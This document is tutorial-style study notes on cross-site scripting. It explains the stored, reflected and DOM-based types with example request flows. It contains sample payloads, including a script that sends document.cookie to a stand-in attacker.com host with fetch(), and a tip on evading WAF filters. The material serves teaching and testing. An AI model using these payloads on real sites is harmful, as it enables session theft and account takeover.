# 1. Understanding Cross-Site Scripting (XSS)

XSS is a common web security vulnerability where attackers inject malicious JavaScript code into websites that don't properly sanitize user input. When other users view the affected page, their browsers unknowingly execute this malicious code.

A typical web application works by receiving the `HTML` code from the back-end server and rendering it on the client-side internet browser. When a vulnerable web application does not properly sanitize user input, a malicious user can inject extra `JavaScript` code in an input field (e.g., `comment/reply`), so once another user views the same page, they unknowingly execute the malicious `JavaScript` code.

---

## 1.1 - What Can XSS Attacks Do?

XSS vulnerabilities enable attackers to run arbitrary JavaScript in a victim's browser, enabling:
- Stealing **session cookies** and sending them to attacker-controlled servers
- Making unauthorized API calls (like changing passwords)
- Mining cryptocurrencies or displaying unwanted ads
- Other malicious actions within the vulnerable website's domain

Because XSS is confined to the browser's JS engine and (in modern browsers) the vulnerable site's own domain, it can't directly achieve system-level code execution. However, if paired with a browser binary vulnerability (e.g., a heap overflow), a skilled attacker can use XSS as a launchpad to escape the browser sandbox and compromise the underlying machine.

XSS has existed in nearly every major web application and has been actively exploited for two decades:

- **Samy Worm (2005):** A stored XSS flaw in MySpace let a self-propagating payload post "Samy is my hero" on viewers' profiles, spreading to over a million accounts in a day. Though harmless in this case, the same flaw could have enabled credential theft, keylogging, or browser exploitation.
- **TweetDeck (2014):** A researcher stumbled on an XSS bug that was used to create a self-retweeting tweet, retweeted 38,000+ times in under two minutes, forcing Twitter to briefly shut down TweetDeck.
- **Google Search (2019)** and **Apache.org (2010)** also suffered XSS vulnerabilities — the latter actively exploited to steal passwords.

These incidents underscore that XSS remains a serious, persistent threat deserving rigorous detection and prevention.

---

## 1.2 - How XSS Works

Cross-Site Scripting (XSS) occurs when a web application takes user-supplied input and renders it back into a page without properly sanitizing or encoding it. Common injection points include **comment fields**, **search boxes**, **URL parameters**, and **reply forms** — anywhere user input eventually gets `reflected into HTML`.

**The basic mechanism:**

**0.** The application accepts input (e.g., a blog comment) and embeds it directly into the page's HTML without escaping special characters like `<`, `>`, or `"`.

**1.** An attacker submits input containing a script tag or event handler instead of plain text:

```html
  <script>alert(document.cookie)</script>
```

  or a more evasive variant using an event handler, useful when `<script>` tags get filtered:

```html
  <img src=x onerror="alert(document.cookie)">
```

**2.** When a victim views the page, their browser parses this injected markup as legitimate code and executes it — not because the browser is flawed, but because it has no way to distinguish the site's intended code from the attacker's injected code.

**Why this is dangerous:**

Because the payload runs in the victim's browser under the vulnerable site's own origin, it inherits that origin's privileges. This lets it sidestep the same-origin policy protections that normally wall off one website's data from another. In practice, this can be used to:

- **Steal session cookies**, allowing the attacker to hijack the victim's authenticated session:
```html
  <script>fetch('https://attacker.com/steal?cookie=' + document.cookie)</script>
```
- **Impersonate the victim**, silently issuing authenticated requests (e.g., changing an email or password) using the victim's active session.
- **Harvest sensitive data** rendered on the page, such as personal details, tokens, or private messages.
- **Manipulate the page's content**, for example injecting fake login forms to phish credentials.

**Scope and risk:**

XSS is a client-side attack — it doesn't directly compromise the server or its infrastructure. This is why it's sometimes underrated relative to server-side vulnerabilities. But its real-world impact is significant: it's one of the most common vulnerability classes found in web applications, and a single successful exploit can lead to full account takeover, data theft, or serve as a stepping stone toward more serious attacks. Given how frequently it appears and how easily it can be chained with other flaws, XSS deserves consistent attention in code review, input validation, and output encoding practices — not just a one-time fix.

---

## 1.3 - Types of XSS

> **Note:** To confirm an XSS vulnerability, inject code that executes JavaScript in your browser. The traditional method uses the `alert()` function as it's simple and obvious when triggered. However, in Chrome (from version 92 onward), `alert()` is blocked in cross-origin iframes, so `print()` is recommended as an alternative for testing certain advanced XSS scenarios.
> **Note:** Beyond the cross-origin iframe restriction, many WAFs and input filters specifically pattern-match on `alert(` as a known XSS proof-of-concept signature. For payloads that need to slip past basic filtering, testers often reach for lower-signature PoCs instead: `print()`, `confirm()`, or a unique side-effect like `document.title = 'xss-poc-<random>'` that can be verified without a visible dialog. Worth internalizing now since filter/WAF evasion will build directly on this habit later.

There are three main types of XSS vulnerabilities:

| Type | Description |
|---|---|
| **Stored (Persistent) XSS** | The most critical type of XSS. Occurs when user input is stored on the back-end database and then displayed upon retrieval (e.g., posts or comments). The malicious script comes from the website's database. |
| **Reflected (Non-Persistent) XSS** | Occurs when user input is displayed on the page after being processed by the backend server, but without being stored (e.g., search result or error message). The malicious script comes from the current HTTP request. |
| **DOM-based XSS** | Occurs when the tainted data source and the vulnerable sink are both in client-side JavaScript — the vulnerability exists in client-side code rather than server-side code. |

---

# 2. Stored XSS

### Definition

The most critical type of XSS vulnerability is `Stored XSS` or `Persistent XSS`. It arises when an application receives data from an untrusted source and includes that data within its later `HTTP` responses in an unsafe way.

The data in question might be submitted to the application via `HTTP` requests; for example, **comments** on a blog post, **user nicknames** in a chat room, or **contact details** on a **customer order**. In other cases, the data might arrive from other untrusted sources; for example, a webmail application displaying **messages received over SMTP**, a marketing application displaying **social media posts**, or a network monitoring application displaying **packet data** from network traffic.

---

### Example flow

Suppose a website allows users to submit comments on blog posts, which are displayed to other users. Users submit comments using an HTTP request like the following:
```
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Length: 100

postId=3&comment=This+post+was+extremely+helpful.&name=Carlos+Montoya&email=carlos%40normal-user.net
```

After this comment has been submitted, any user who visits the blog post will receive the following within the application's response:
```
<p>This post was extremely helpful.</p>
```

Assuming the application doesn't perform any other processing of the data, an attacker can submit a malicious comment like this:
```js
<script>alert('Hacked')</script>
```

Other users who visit the page will now receive the following within the application's response::
```
<p><script>alert('Hacked')</script></p>
```

The script supplied by the attacker will then execute in the victim user's browser, in the context of their session with the application. In this case, `a pop-up alert with message: "Hacked"` show up in the victim browser.

---

### Impact of stored XSS attacks

If our injected XSS payload gets stored in the back-end database and retrieved upon visiting the page, this means that our XSS attack is persistent and may affect any user that visits the page.

This makes this type of XSS the most critical, as it affects a much wider audience since any user who visits the page would be a victim of this attack. Furthermore, Stored XSS may not be easily removable, and the payload may need removing from the back-end database.

> **Tip**: Many modern web apps use cross-domain iframes for user input, so an XSS bug in the form may not affect the main app. Using `window.origin` instead of a static value like `1`, or `hacked` reveals which URL the alert fired on—confirming whether the iframe form (or the main page) is the vulnerable one.

Since some browsers block `alert()` in certain contexts, other payloads help confirm XSS: `<plaintext>` stops HTML rendering and shows everything after it as raw text, while `<script>print()</script>` opens the print dialog and is rarely blocked. Try both, and use reset to clear payloads.

To check persistence, refresh the page. If the alert fires again, the payload is stored on the back-end—confirming Stored/Persistent XSS. This isn't user-specific: anyone visiting the page will trigger it too.

# 3. Reflected XSS

### Definition

There are two types of `Non-Persistent XSS`: 
- `Reflected XSS`, processed by the back-end
- `DOM-based XSS`, processed entirely client-side without reaching the server.

Unlike Persistent XSS, both are temporary — they don't survive page refreshes and only affect the targeted user, not other visitors.

`Reflected XSS` occurs when input reaches the server and is returned unsanitized, such as in error or confirmation messages. Testing XSS payloads here may trigger execution, but since these messages are temporary, leaving the page ends the attack — hence `Non-Persistent`.

---

### Example flow

Reflected XSS is the simplest variety of cross-site scripting. It arises when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way.

Suppose a website has a search function which receives the user-supplied search term in a URL parameter:
```
https://insecure-website.com/search?term=gift
```

The application echoes the supplied search term in the response to this URL:
```
<p>You searched for: gift</p>
```

Assuming the application doesn't perform any other processing of the data, an attacker can `construct an attack like this and then send it to the victim`:
```
https://insecure-website.com/search?term=<script>alert('Hacked')</script>
```

If another user of the application requests the attacker's URL, then the script supplied by the attacker will execute in the victim user's browser, in the context of their session with the application. In this case, `a pop-up alert with message: "Hacked"` show up in the victim browser.

---

### Impact of reflected XSS attacks

If an attacker controls a script executed in the victim's browser, they can typically fully compromise that user. Amongst other things, the attacker can:
- Perform any action within the application that the user can perform.
- View any information that the user is able to view.
- Modify any information that the user is able to modify.
- Initiate interactions with other application users, including malicious attacks, that will appear to originate from the initial victim user.

Delivery requires tricking the victim into making an attacker-controlled request — via a **malicious link on a website**, in **generated content**, or sent through **email/social media** — either targeting a specific user or indiscriminately. Because it needs this external delivery mechanism, reflected XSS is generally less severe than stored XSS, which can be self-contained within the vulnerable app itself.

---

# 4. DOM XSS

The third and final type of XSS is another `Non-Persistent` type called `DOM-based XSS`. While `reflected XSS` sends the input data to the back-end server through HTTP requests, DOM XSS is completely processed on the client-side through JavaScript. DOM XSS occurs when JavaScript is used to change the page source through the `Document Object Model (DOM)`.
